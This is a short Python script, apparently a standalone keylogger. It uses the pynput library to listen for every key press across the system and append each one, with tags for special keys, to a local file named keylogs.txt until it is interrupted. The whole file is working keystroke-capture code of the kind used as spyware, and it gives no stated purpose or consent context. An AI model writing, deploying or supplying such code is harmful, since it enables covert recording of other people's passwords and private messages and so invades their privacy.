import os
from pynput import keyboard

# Define a dictionary to map special keys to readable strings
special_keys = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '\n',
    keyboard.Key.tab: '\t',
    keyboard.Key.backspace: '[BACKSPACE]',
    keyboard.Key.delete: '[DELETE]',
    keyboard.Key.ctrl_l: '[CTRL_L]',
    keyboard.Key.ctrl_r: '[CTRL_R]',
    keyboard.Key.alt_l: '[ALT_L]',
    keyboard.Key.alt_r: '[ALT_R]',
    keyboard.Key.shift_l: '[SHIFT_L]',
    keyboard.Key.shift_r: '[SHIFT_R]'
}

# Function to handle key presses
def on_press(key):
    try:
        # Check if the key is a special key and map it accordingly
        if isinstance(key, keyboard.Key) and key in special_keys:
            log = special_keys[key]
        else:
            # Convert the key to a string and remove any single quotes
            log = str(key).replace("'", "")
        
        # Append the keystroke to the log file
        with open('keylogs.txt', 'a') as f:
            f.write(log)
    except Exception as e:
        print(f"Error logging key press: {e}")

# Function to handle key releases (not used in this script)
def on_release(key):
    pass

# Create the log file if it doesn't exist
if not os.path.exists('keylogs.txt'):
    with open('keylogs.txt', 'w') as f:
        f.write("")

# Start listening for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("Keyboard logging stopped.")